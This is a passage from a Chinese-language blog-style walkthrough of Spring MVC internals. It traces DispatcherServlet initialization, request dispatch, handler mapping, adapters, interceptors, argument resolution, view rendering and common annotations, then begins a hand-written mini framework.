value=&quot;/WEB-INF/jsp/&quot; /&gt;       &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;       &lt;property name=&quot;viewNames&quot; value=&quot;*&quot;/&gt;       &lt;!-- 模板优先级别 --&gt;         &lt;property name=&quot;order&quot; value=&quot;1&quot;&gt;&lt;/property&gt;   &lt;/bean&gt;      &lt;!-- html --&gt;   &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;         id=&quot;htmlViewResolver&quot;&gt;       &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/html/&quot; /&gt;       &lt;property name=&quot;suffix&quot; value=&quot;.html&quot; /&gt;       &lt;property name=&quot;viewNames&quot; value=&quot;*&quot;/&gt;       &lt;!-- 模板优先级别 --&gt;         &lt;property name=&quot;order&quot; value=&quot;0&quot;&gt;&lt;/property&gt;   &lt;/bean&gt;\n\n当然视图解析器不是必要的，在如今流行的前后端开发模式下，即基于ajax的异步请求，用json数据交互时（@RequestBody与@ResponseBody），可以不配置任何视图解析器。\n源码解析前端控制器前端控制器对应DispatcherServlet类，是整个SpringMvc的核心\n启动和初始化Tomcat在启动时会调用所有Servlet的init方法，其中就包括了DispatcherServlet。\n它的init方法在父类HttpServletBean中实现：\n父类HttpServletBean中有\n@Overridepublic final void init() throws ServletException &#123;    // Set bean properties from init parameters.    ...........        // Let subclasses do whatever initialization they like.        // 调用子类FrameworkServlet的initServletBean方法        initServletBean();&#125;\n\nFrameworkServlet\n@Overrideprotected final void initServletBean() throws ServletException &#123;    ....        //一些Log        try &#123;            //调用initWebApplicationContext()方法            this.webApplicationContext = initWebApplicationContext();            initFrameworkServlet();        &#125;    catch (ServletException | RuntimeException ex) &#123;        logger.error(&quot;Context initialization failed&quot;, ex);        throw ex;    &#125;    ....        //一些Log&#125;protected WebApplicationContext initWebApplicationContext() &#123;\t...\tWebApplicationContext wac = null;\t...       // 创建WebApplicationContext容器\twac = createWebApplicationContext(rootContext);\t// 调用子类DispatcherServlet的onRefresh方法\tonRefresh(wac);\t&#125;\n\n前端控制器DispatcherServlet：\n@Override//刷新上下文protected void onRefresh(ApplicationContext context) &#123;    //调用DispatcherServlet的initStrategies方法    initStrategies(context);&#125;protected void initStrategies(ApplicationContext context) &#123;    initMultipartResolver(context);    initLocaleResolver(context);    initThemeResolver(context);    //初始化处理器映射器\t    initHandlerMappings(context);    //初始化处理器适配器    initHandlerAdapters(context);    initHandlerExceptionResolvers(context);    initRequestToViewNameTranslator(context);    //初始化视图解析器    initViewResolvers(context);    initFlashMapManager(context);&#125;private void initHandlerMappings(ApplicationContext context) &#123;    this.handlerMappings = null;    if (this.detectAllHandlerMappings) &#123;        // 这里会找到注解使用的处理器映射器RequestMappingHandlerMapping        //其中保存了所有控制器中[请求路径]和[方法]的对应集合Map        Map&lt;String, HandlerMapping&gt; matchingBeans =            BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerMapping.class, true, false);        if (!matchingBeans.isEmpty()) &#123;            this.handlerMappings = new ArrayList&lt;&gt;(matchingBeans.values());            // We keep HandlerMappings in sorted order.            AnnotationAwareOrderComparator.sort(this.handlerMappings);        &#125;    &#125;    ....&#125;\n\n初始化操作结束，完成了一系列元器件的配置和初始化。\n处理请求初始化流程大致了解完了，SpringMVC如何处理一个请求？客户端请求到达后，根据Servlet规范，首先会调用父类HttpServlet的service方法：\n protected void service(HttpServletRequest req, HttpServletResponse resp)     throws ServletException, IOException &#123;     String method = req.getMethod();     // 通过不同的请求方式调用不同的方法     // 最后都会来到子类FrameworkServlet的processRequest     if (method.equals(METHOD_GET)) &#123;...         doGet(req, resp);         ...     &#125; &#125;protected final void processRequest(HttpServletRequest request,                                        HttpServletResponse response)\t\tthrows ServletException, IOException &#123;\t...\t// 调用子类DispatcherServlet的doService方法\tdoService(request, response);\t&#125;\n\n接下来我们走进DispatcherServlet来查看后续操作\n@Overrideprotected void doService(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;    logRequest(request);    // Keep a snapshot of the request attributes in case of an include,    // to be able to restore the original attributes after the include.    Map&lt;String, Object&gt; attributesSnapshot = null;    ........        // 设置属性！√        request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE, getWebApplicationContext());    request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, this.localeResolver);    request.setAttribute(THEME_RESOLVER_ATTRIBUTE, this.themeResolver);    request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());    ......        try &#123;            doDispatch(request, response);        &#125;    ......&#125;\n\n接下来我们走进doDispatch方法√！\n//请求处理器的核心protected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;    HttpServletRequest processedRequest = request;    HandlerExecutionChain mappedHandler = null;    boolean multipartRequestParsed = false;      WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);    try &#123;        ModelAndView mv = null;        Exception dispatchException = null;        try &#123;\t            //检查当前请求是否是文件上传            processedRequest = checkMultipart(request);            multipartRequestParsed = (processedRequest != request);            // Determine handler for the current request.            // 1.调用getHandler方法，通过处理器映射器HandlerMapping找到调用链            // HandlerExecutionChain，其中包含一个Handler和一个拦截器数组            mappedHandler = getHandler(processedRequest);            //如果为空，说明没有匹配的处理器            if (mappedHandler == null) &#123;                noHandlerFound(processedRequest, response);                return;            &#125;            // Determine handler adapter for the current request.\t\t\t// 2.获取处理器适配器HandlerAdapter            // 传入调用链HandlerExecutionChain中的处理器handler            HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());            // Process last-modified header, if supported by the handler.            String method = request.getMethod();            boolean isGet = &quot;GET&quot;.equals(method);            if (isGet || &quot;HEAD&quot;.equals(method)) &#123;                long lastModified = ha.getLastModified(request, mappedHandler.getHandler());                if (new ServletWebRequest(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;                    return;                &#125;            &#125;            \t\t\t// 调用拦截器的前置方法            if (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;                return;            &#125;            // Actually invoke the handler.            // 3.通过处理器适配器HandlerAdapter调用处理器Handler           \t// 返回一个ModelAndView            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());            if (asyncManager.isConcurrentHandlingStarted()) &#123;                return;            &#125;            applyDefaultViewName(processedRequest, mv);            //执行拦截器的后置方法            mappedHandler.applyPostHandle(processedRequest, response, mv);                    &#125;        catch (Exception ex) &#123;            dispatchException = ex;        &#125;        catch (Throwable err) &#123;            // As of 4.3, we&#x27;re processing Errors thrown from handler methods as well,            // making them available for @ExceptionHandler methods and other scenarios.            dispatchException = new NestedServletException(&quot;Handler dispatch failed&quot;, err);        &#125;                // 4.处理ModelAndView        // 调用视图解析器ViewResolver        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);    &#125;.............    finally &#123;        if (asyncManager.isConcurrentHandlingStarted()) &#123;            // Instead of postHandle and afterCompletion            if (mappedHandler != null) &#123;                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);            &#125;        &#125;        else &#123;            // Clean up any resources used by a multipart request.            if (multipartRequestParsed) &#123;                cleanupMultipart(processedRequest);            &#125;        &#125;    &#125;&#125;\n\n我们看到源码给我们的表现为：\n//获取处理器执行链[处理器映射器]mappedHandler = getHandler(processedRequest);//获得处理器适配器HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());//进行拦截器前置方法配置mappedHandler.applyPreHandle(processedRequest, response);//使用处理器适配器完成Controller方法调用mv = ha.handle(processedRequest, response, mappedHandler.getHandler());//拦截器后置方法配置mappedHandler.applyPostHandle(processedRequest, response, mv);//视图解析器解析processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);\n\n整体的代码流程就是如上述所示，接下来我们按顺序分析各个内部实现\n处理器映射器@Nullableprotected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception &#123;    // 通过处理器映射器handlerMapping找到调用链HandlerExecutionChain    // 如果handleMapping不为空    if (this.handlerMappings != null) &#123;        // 变量handlerMappings处理器映射器        for (HandlerMapping mapping : this.handlerMappings) &#123;            // 调用处理器映射器的getHandler方法            // 可以根据请求找到匹配的调用链HandlerExecutionChain            HandlerExecutionChain handler = mapping.getHandler(request);            if (handler != null) &#123;                return handler;            &#125;        &#125;    &#125;    return null;&#125;@Override@Nullablepublic final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception &#123;    // 调用子类的getHandlerInternal方法找到处理器handler   \t// 包括AbstractHandlerMethodMapping和AbstractUrlHandlerMapping    Object handler = getHandlerInternal(request);    if (handler == null) &#123;        //如果为空，就拿默认的        handler = getDefaultHandler();    &#125;    //依旧为空 直接返回    if (handler == null) &#123;        return null;    &#125;    // Bean name or resolved handler?    if (handler instanceof String) &#123;        String handlerName = (String) handler;        handler = obtainApplicationContext().getBean(handlerName);    &#125;   // 通过getHandlerExecutionChain方法拿到调用链HandlerExecutionChain   // 该方法中会获取拦截器    HandlerExecutionChain executionChain = getHandlerExecutionChain(handler, request);    ......    if (CorsUtils.isCorsRequest(request)) &#123;        CorsConfiguration globalConfig = this.corsConfigurationSource.getCorsConfiguration(request);        CorsConfiguration handlerConfig = getCorsConfiguration(handler, request);        CorsConfiguration config = (globalConfig != null ? globalConfig.combine(handlerConfig) : handlerConfig);        executionChain = getCorsHandlerExecutionChain(request, executionChain, config);    &#125;    return executionChain;&#125;\n\n处理器映射器的作用主要就是根据请求，获取处理器调用链HandlerExecutionChain返回给前端控制器。\n\n可以发现映射器发现了处理器调用链，确定了调用的是谁。\n处理器适配器还记得我们怎么认为适配器的吗？\n我们可以把公共的功能都定义在适配器中，从而减少每种控制器中都有的重复性代码\n在前端控制器DispatcherServlet中调用getHandlerAdapter方法获取一个处理器适配器：\n//HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());protected HandlerAdapter getHandlerAdapter(Object handler) throws ServletException &#123;    //如果handlerAdapters为空直接返回    if (this.handlerAdapters为空直接返回 != null) &#123;        for (HandlerAdapter adapter : this.handlerAdapters) &#123;            //handlerAdapters中有handlerAdapter合适就直接返回            // 判断当前的HandlerAdapter是否支持调用HandlerExecutionChain\t            if (adapter.supports(handler)) &#123;                return adapter;            &#125;        &#125;    &#125;    ....&#125;\n\n拦截器拦截器有前置方法和后置方法，这里统一分析\n//前置方法boolean applyPreHandle(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;    //获取拦截器    HandlerInterceptor[] interceptors = getInterceptors();    //不为空    if (!ObjectUtils.isEmpty(interceptors)) &#123;        for (int i = 0; i &lt; interceptors.length; i++) &#123;            //遍历拦截器集合            HandlerInterceptor interceptor = interceptors[i];            //调用preHandle方法            //根据自定义的拦截器的前置方法的配置             // 如果preHandle方法如果返回false 说明在这里被拦截了，那就暂时停下来            // 如果返回true 那么接着看后续的拦截器，看是否通过            if (!interceptor.preHandle(request, response, this.handler)) &#123;                triggerAfterCompletion(request, response, null);                return false;            &#125;            this.interceptorIndex = i;        &#125;    &#125;    return true;&#125;//后置方法void applyPostHandle(HttpServletRequest request, HttpServletResponse response, @Nullable ModelAndView mv)    throws Exception &#123;    //照旧获取所有拦截器    HandlerInterceptor[] interceptors = getInterceptors();    if (!ObjectUtils.isEmpty(interceptors)) &#123;        //从最后一个拦截器到第一个拦截器        for (int i = interceptors.length - 1; i &gt;= 0; i--) &#123;            HandlerInterceptor interceptor = interceptors[i];            //调用后置方法            interceptor.postHandle(request, response, this.handler, mv);        &#125;    &#125;&#125;\n\n我们看到后置方法的调用是每一个都必须被调用的，从尾到前。\n而不像前置方法那样会中途不进行后续拦截器的前置方法了，从前到后。\n两者的执行顺序也很好的对应起来。\n\n拦截器的AOP内\nAOP思想是Spring框架的两大核心之一，是解决方法调用依赖以及提高方便后期代码维护的重要思想。\n它是把我们代码中高度重复的部分抽取出来，并在适当的时机，通过代理机制来执行，从而做到不修改源码对已经写好的方法进行增强。 \n而拦截器正式这种思想的具体实现。\n\n适配器执行handle方法拿到处理器适配器后，经过拦截器的前置方法的调用，再通过其handle方法调用传入的处理器。前面我们介绍了，根据处理器的不同实现，会找到不同的处理器适配器，下面我们就介绍两种不同的处理器是配置。\n基于Controller接口如果处理器是基于Controller接口实现的，那么使用的处理器适配器是SimpleControllerHandlerAdapter：\npublic ModelAndView handle(HttpServletRequest request,                           HttpServletResponse response, Object handler)                                 throws Exception &#123;// 把Handler转成Controller，因为Handler实现了Controller接口   // 调用Controller的handleRequest方法   return ((Controller) handler).handleRequest(request, response);&#125;\n\n基于注解对于基于注解@Controller实现的处理器，流程相对比较复杂，原因如下：\n\n上面这种处理器都是基于接口的，一个实现类中只有一个具体的处理方法，拿到该类的Bean后就可以直接调用方法。而@Controller标注的处理器类中，可能有很多@RequestMapping方法。\n上面两种处理器的方法中的参数都是HttpServletRequest和HttpServletResponse对象，直接传入即可。而通过注解@RequestMapping标注的处理器方法中，参数是程序员自定义的，这就涉及到了参数解析与注入的问题。\n\n其实我们也比较喜欢使用注解的方式来调用，那么仔细研究注解的处理器调用吧\n基于注解@Controller的处理器适配器是RequestMappingHandlerAdapter：\n//基本调用@Override@Nullablepublic final ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler)    throws Exception &#123;    return handleInternal(request, response, (HandlerMethod) handler);&#125;@Overrideprotected ModelAndView handleInternal(HttpServletRequest request,                                      HttpServletResponse response, HandlerMethod handlerMethod) throws Exception &#123;    ModelAndView mav;    checkRequest(request);    // Execute invokeHandlerMethod in synchronized block if required.    // 都是调用invokeHandlerMethod方法    if (this.synchronizeOnSession) &#123;        HttpSession session = request.getSession(false);        if (session != null) &#123;            Object mutex = WebUtils.getSessionMutex(session);            synchronized (mutex) &#123;                mav = invokeHandlerMethod(request, response, handlerMethod);            &#125;        &#125;        else &#123;            // No HttpSession available -&gt; no mutex necessary            mav = invokeHandlerMethod(request, response, handlerMethod);        &#125;    &#125;    else &#123;        // No synchronization on session demanded at all...        mav = invokeHandlerMethod(request, response, handlerMethod);    &#125;    ........        return mav;&#125;@Nullableprotected ModelAndView invokeHandlerMethod(HttpServletRequest request,                                           HttpServletResponse response, HandlerMethod handlerMethod) throws Exception &#123;    ServletWebRequest webRequest = new ServletWebRequest(request, response);    try &#123;        WebDataBinderFactory binderFactory = getDataBinderFactory(handlerMethod);        ModelFactory modelFactory = getModelFactory(handlerMethod, binderFactory);        //非核心代码        ............            invocableMethod.invokeAndHandle(webRequest, mavContainer);        if (asyncManager.isConcurrentHandlingStarted()) &#123;            return null;        &#125;        return getModelAndView(mavContainer, modelFactory, webRequest);    &#125;    finally &#123;        webRequest.requestCompleted();    &#125;&#125;public void invokeAndHandle(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,                            Object... providedArgs) throws Exception &#123;    //调用invokeForRequest    Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs);    setResponseStatus(webRequest);    //一些判断然后return方法    ..............&#125;\n\n另起一个再来看，比较清楚\n@Nullablepublic Object invokeForRequest(NativeWebRequest request, @Nullable ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception &#123;    // 通过getMethodArgumentValues方法获取请求参数    Object[] args = this.getMethodArgumentValues(request, mavContainer, providedArgs);    if (this.logger.isTraceEnabled()) &#123;        this.logger.trace(&quot;Arguments: &quot; + Arrays.toString(args));    &#125;    // 通过doInvoke调用处理器，通过反射调用    return this.doInvoke(args);&#125;//获取请求参数protected Object[] getMethodArgumentValues(NativeWebRequest request, @Nullable ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception &#123;    //请求参数不为空    if (ObjectUtils.isEmpty(this.getMethodParameters())) &#123;        return EMPTY_ARGS;    &#125; else &#123;        //拿到设置的参数        MethodParameter[] parameters = this.getMethodParameters();        Object[] args = new Object[parameters.length];        //遍历参数        for(int i = 0; i &lt; parameters.length; ++i) &#123;            MethodParameter parameter = parameters[i];            parameter.initParameterNameDiscovery(this.parameterNameDiscoverer);            args[i] = findProvidedArgument(parameter, providedArgs);            if (args[i] == null) &#123;                ...........                    try &#123;                        // 通过HandlerMethodArgumentResolverComposite参数                        // 解析组件的resolveArgument方法解析参数                        args[i] = this.resolvers.resolveArgument(parameter,                                                                  mavContainer, request, this.dataBinderFactory);                    &#125; catch (Exception var10) &#123;                        ..........                    &#125;            &#125;        &#125;        //返回参数数组        return args;    &#125;&#125;// 调用处理器@Nullableprotected Object doInvoke(Object... args) throws Exception &#123;    try &#123;        // 这里就调用Controller里的对应方法        // 通过反射：        // getBean()就是Controller的实例        // args就是参数        return this.getBridgedMethod().invoke(this.getBean(), args);    &#125;...........&#125;protected Method getBridgedMethod() &#123;    //这里的是    return this.bridgedMethod;&#125;\n\n\n通过这个看到了我们的getBridgedMethod()可以得到具体方法的Method类。\n\n这里附送一个反射的Demo\npublic class DemoInvoke &#123;    public void put(String name)&#123;        System.out.println(&quot;被反射了&quot;);        System.out.println(&quot;name参数：&quot; + name);    &#125;    public static void main(String[] args) throws Exception &#123;        //一定要全限定类名来获取Class对象        Class&lt;?&gt; demoInvoke = Class.forName(&quot;com.example.mvcdemo.invokeLi.DemoInvoke&quot;);        Object liduoan = demoInvoke.newInstance();        //获取Method类        Method put = demoInvoke.getMethod(&quot;put&quot;, String.class);        //直接唤醒方法        put.invoke(liduoan,&quot;liduoan&quot;);    &#125;&#125;\n\n好的，接下来我们接着再看下参数解析吧\n@Nullablepublic Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123;    HandlerMethodArgumentResolver resolver = this.getArgumentResolver(parameter);    if (resolver == null) &#123;        throw ....    &#125; else &#123;        //返回AbstractNamedValueMethodArgumentResolver的resolveArgument方法        return resolver.resolveArgument(parameter, mavContainer,                                         webRequest, binderFactory);    &#125;&#125;\n\nAbstractNamedValueMethodArgumentResolver类：\n@Nullablepublic final Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123;    AbstractNamedValueMethodArgumentResolver.NamedValueInfo namedValueInfo = this.getNamedValueInfo(parameter);    MethodParameter nestedParameter = parameter.nestedIfOptional();    Object resolvedName = this.resolveStringValue(namedValueInfo.name);    .....   // 根据参数名解析出参数，调用子类的resolveName方法，有很多实现子类比如：   // 1.RequestParamMethodArgumentResolver没有注解   // 2.PathVariableMethodArgumentResolver有@PathVariable注解        Object arg = this.resolveName(resolvedName.toString(), nestedParameter, webRequest);    ....    return arg;&#125;\n\n拿子类RequestParamMethodArgumentResolver为例：\nprotected Object resolveName(String name, MethodParameter parameter, NativeWebRequest request) throws Exception &#123;   HttpServletRequest servletRequest = request.getNativeRequest(HttpServletRequest.class);   if (servletRequest != null) &#123;      Object mpArg = MultipartResolutionDelegate.resolveMultipartArgument(name, parameter, servletRequest);      if (mpArg != MultipartResolutionDelegate.UNRESOLVABLE) &#123;         return mpArg;      &#125;   &#125;   Object arg = null;   MultipartHttpServletRequest multipartRequest = request.getNativeRequest(MultipartHttpServletRequest.class);   // 针对文件上传   if (multipartRequest != null) &#123;      List&lt;MultipartFile&gt; files = multipartRequest.getFiles(name);      if (!files.isEmpty()) &#123;         arg = (files.size() == 1 ? files.get(0) : files);      &#125;   &#125;   if (arg == null) &#123;      // 最终通过request的getParameterValues方法拿到参数      String[] paramValues = request.getParameterValues(name);      if (paramValues != null) &#123;         arg = (paramValues.length == 1 ? paramValues[0] : paramValues);      &#125;   &#125;   return arg;&#125;\n\n到这里结束可以简略的得到下面的图：\n\n视图解析器在前端控制器DispatcherServlet中调用processDispatchResult方法获取处理ModelAndView结果对象：\nprocessDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);\n↑这就是方法调用全局。\nprivate void processDispatchResult(HttpServletRequest request, HttpServletResponse response,@Nullable HandlerExecutionChain mappedHandler,@Nullable ModelAndView mv,@Nullable Exception exception) throws Exception &#123;    boolean errorView = false;\t//有异常情况，就debug，然后再mv中设置信息    if (exception != null) &#123;        if (exception instanceof ModelAndViewDefiningException) &#123;            logger.debug(&quot;ModelAndViewDefiningException encountered&quot;, exception);            mv = ((ModelAndViewDefiningException) exception).getModelAndView();        &#125;        else &#123;            Object handler = (mappedHandler != null ? mappedHandler.getHandler() : null);            mv = processHandlerException(request, response, handler, exception);            errorView = (mv != null);        &#125;    &#125;    // Did the handler return a view to render?    // ModelAndView不为空    if (mv != null &amp;&amp; !mv.wasCleared()) &#123;        // 调用render渲染数据        render(mv, request, response);        if (errorView) &#123;            WebUtils.clearErrorRequestAttributes(request);        &#125;    &#125;    .........&#125;protected void render(ModelAndView mv, HttpServletRequest request, HttpServletResponse response) throws Exception &#123;    // Determine locale for request and apply it to the response.    Locale locale =        (this.localeResolver != null ? this.localeResolver.resolveLocale(request) : request.getLocale());    response.setLocale(locale);    View view;    //获取视图名称    String viewName = mv.getViewName();    if (viewName != null) &#123;        // We need to resolve the view name.        // 调用resolveViewName方法        // 通过视图解析器解析视图名称，返回View对象        view = resolveViewName(viewName, mv.getModelInternal(), locale, request);      \t.......    try &#123;        if (mv.getStatus() != null) &#123;            response.setStatus(mv.getStatus().value());        &#125;        //使用render渲染数据        view.render(mv.getModelInternal(), request, response);    &#125;    ......&#125;    // 通过视图解析器解析视图名称，返回View对象protected View resolveViewName(String viewName, @Nullable Map&lt;String, Object&gt; model,\t\tLocale locale, HttpServletRequest request) throws Exception &#123;\t//视图解析器集合不为空\tif (this.viewResolvers != null) &#123;        // 遍历视图解析器\t\tfor (ViewResolver viewResolver : this.viewResolvers) &#123;               // 通过视图解析器的resolveViewName方法解析视图，得到视图对象               // 这里最终会调用到UrlBasedViewResolver类的createView方法               // 它是我们常用的InternalResourceViewResolver的父类\t\t\tView view = viewResolver.resolveViewName(viewName, locale);\t\t\tif (view != null) &#123;                   // 视图对象不为空说明解析成功，直接返回\t\t\t\treturn view;\t\t\t&#125;\t\t&#125;\t&#125;\treturn null;&#125;\n\n\n我们先看看对应的viewResolver.resolveViewName方法：\n就先看一个实现类[也是一个视图解析器类]：AbstractCachingViewResolver\n@Override@Nullablepublic View resolveViewName(String viewName, Locale locale) throws Exception &#123;    // 这个内存是不大于0 就为false 进入方法内    // 也就是这个解析器中没有任何的视图，直接创造一个    if (!isCache()) &#123;        return createView(viewName, locale);    &#125;    else &#123;        //通过视图获取key        Object cacheKey = getCacheKey(viewName, locale);        //通过key获取对应视图        View view = this.viewAccessCache.get(cacheKey);        //如果这个视图获取为空        if (view == null) &#123;            //加锁            synchronized (this.viewCreationCache) &#123;                //简单的并发单例                view = this.viewCreationCache.get(cacheKey);                //还是为空                if (view == null) &#123;                    // Ask the subclass to create the View object.                    // 创造一个                    /**                    猜测是每个解析器有只能生产特定的视图。                    所有可能生产不出来为空                    这也是上面遍历解析器的时候，得到的View可能为null的原因                    */                    view = createView(viewName, locale);                    if (view == null &amp;&amp; this.cacheUnresolved) &#123;                        view = UNRESOLVED_VIEW;                    &#125;                    if (view != null) &#123;                        this.viewAccessCache.put(cacheKey, view);                        this.viewCreationCache.put(cacheKey, view);                    &#125;                &#125;            &#125;        &#125;        else &#123;            if (logger.isTraceEnabled()) &#123;                logger.trace(formatKey(cacheKey) + &quot;served from cache&quot;);            &#125;        &#125;        return (view != UNRESOLVED_VIEW ? view : null);    &#125;&#125;\n\n按我们上面的图的说法，得到了View之后，我们就可以调用他的render进行渲染了。\n那么我们再看下视图的抽象父类AbstractView中的render方法：\n@Overridepublic void render(@Nullable Map&lt;String, ?&gt; model, HttpServletRequest request,                   HttpServletResponse response) throws Exception &#123;\t//一大串Log    ...            Map&lt;String, Object&gt; mergedModel = createMergedOutputModel(model, request, response);    prepareResponse(request, response);    // 调用renderMergedOutputModel方法    renderMergedOutputModel(mergedModel, getRequestToExpose(request), response);&#125;// 抽象类方法// 调用视图的具体实现类的renderMergedOutputModel// InternalResourceView就是我们最常用的视图实现，它针对JSPprotected abstract void renderMergedOutputModel(    Map&lt;String, Object&gt; model, HttpServletRequest request, HttpServletResponse response) throws Exception;\n\n注意到，如果选用AbstractView这个抽象父类的话，其抽象方法为：renderMergedOutputModel\n也就是说继承这个抽象父类的子类，仅仅需要实现这个抽象方法，而不必理会render方法，也就是不需要重写。\n那么我们可以看看其实现类InternalResourceView的具体实现了：\nprotected void renderMergedOutputModel(      Map&lt;String, Object&gt; model, HttpServletRequest request, HttpServletResponse response) throws Exception &#123;   // Expose the model object as request attributes.   exposeModelAsRequestAttributes(model, request);   // Expose helpers as request attributes, if any.   exposeHelpers(request);   // Determine the path for the request dispatcher.   String dispatcherPath = prepareForRendering(request, response);   // 得到RequestDispatcher转发器对象，这是Servlet中的API   // 在最早的Servlet中我们会通过request.getRequestDispatcher().forward()转发请求   RequestDispatcher rd = getRequestDispatcher(request, dispatcherPath);   ...   // 如果调用的是RequestDispatcher的include方法   if (useInclude(request, response)) &#123;      response.setContentType(getContentType());      ...      rd.include(request, response);   &#125;   // 如果调用的是RequestDispatcher的forward方法   else &#123;      ...      rd.forward(request, response);   &#125;&#125;\n\n最终通过RequestDispatcher转发器对象将model中的数据封装到请求中，发送给视图。\nSpringMVC常用注解@RequestBody和@RequestParam直接举例：\n@GetMapping(&quot;liduoan&quot;)public String getController(@RequestParam(&quot;name&quot;)String name&#123;    System.out.println(name);    return name;&#125;                            @RequestMapping(&quot;hello&quot;)public String getController(@RequestBody String name)&#123;    System.out.println(name);    return name;&#125;\n\n注解@RequestBody主要用来接收前端传递给后端的json字符串中的数据的(请求体中的数据的)。\n由于GET方式无请求体，所以使用@RequestBody接收数据时，前端不能使用GET方式提交数据，而是用POST方式进行提交。\n注解@RequestParam接收的是请求中 key-value 里面的参数（该注解中可以指定参数的名称），它会被切面进行处理从而可以用普通元素、数组、集合、对象等接收。\n在后端的同一个接收方法里，@RequestBody与@RequestParam可以同时使用，@RequestBody最多只能有一个，而@RequestParam可以有多个。\n更加偏向于传参的结果。\n@JsonAlias和@JsonProperty这两个注解都是用于实体类模型的属性上，用于json字符串中参数名key和实体类中的属性名的转化。\n注解@JsonAlias在json转模型时，使json中的特定key能转化为特定的模型属性；但是模型转json时，对应的转换后的key仍然与属性名一致。\n注解@JsonProperty在json转模型时，使json中的特定key能转化为指定的模型属性；同样，模型转json时，对应的转换后的key为注解中指定的key。\n另外@JsonAlias注解需要依赖于setter、getter，而@JsonProperty注解不需要。\n手写SpringMvcDispatcherServlet的初始化首先我们知晓是通过web.xml进行DispatcherServlet的注册：\n&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;&lt;web-app&gt;  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;  &lt;!--配置前端控制器--&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;com.springmvc.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;      &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;!--Web服务器一旦启动，Servlet就会实例化创建对象，然后初始化(预备创建对象)--&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;\n\n那么我们关注DispatcherServlet，\n首先是通过这个前端控制器完成SpringMvc的容器注册，也就是在它的初始化中完成。\n@Overridepublic void init() throws ServletException &#123;    //1、加载初始化参数   classpath:springmvc.xml    String  contextConfigLocation =  this.getServletConfig().getInitParameter(&quot;contextConfigLocation&quot;);    //2、创建Springmvc容器    webApplicationContext = new WebApplicationContext(contextConfigLocation);    //3、进行初始化操作    webApplicationContext.onRefresh();    //4、初始化请求映射关系   /findUser   ===》控制器.方法    initHandlerMapping();&#125;\n\n也就是简单的获取XML文件中的数据，我们应该从springmvc.xml进行扫描处理\n接着我们创建了容器，调用容器的初始化操作，最后把请求映射关系的调用链给放入Map中。\n这些都是在前端控制器的初始化阶段就完成了。\nSpringMvc容器我们来先分析容器的内部\npublic class WebApplicationContext &#123;    //classpath:springmvc.xml    String contextConfigLocation;    //定义集合  用于存放 bean 的权限名|包名.类名    List&lt;String&gt; classNameList = new ArrayList&lt;String&gt;();    //创建Map集合用于扮演IOC容器：  key存放bean的名字   value存放bean实例    public Map&lt;String,Object&gt; iocMap = new ConcurrentHashMap&lt;&gt;();    /**     * 初始化Spring容器     */    public void onRefresh()&#123;        //1、进行解析springmvc配置文件操作  ==》 com.baiqi.controller,com.baiqi.service         String pack = XmlPaser.getbasePackage(contextConfigLocation.split(&quot;:&quot;)[1]);         String[] packs = pack.split(&quot;,&quot;);         //2、进行包扫描         for(String pa : packs)&#123;             excuteScanPackage(pa);         &#125;         //3、实例化容器中bean        executeInstance();         //4、进行 自动注入操作        executeAutoWired();    &#125;&#125;\n\n显而易见，容器完成了Bean的创建，完成了Bean的注入操作\n在这个容器中有扫描的各个类的全限定类名集合，有Bean的Map。\n总体流程是先通过传入的参数【也就是传入字符串springmvc.xml\n之后通过解析XML获得对应的包。然后扫描包，把全限定类名放入集合中\n之后实例化被注解修饰的Bean，之后再进行注入。\n// 注册Beanpublic void executeInstance()&#123;    try&#123;        //遍历全限定类名集合        for (String className : classNameList) &#123;\t\t\t//通过全限定类名获取class            Class&lt;?&gt; clazz =   Class.forName(className);            //判断是否为加了Controller注解            if(clazz.isAnnotationPresent(Controller.class))&#123;                //控制层 bean                String beanName = 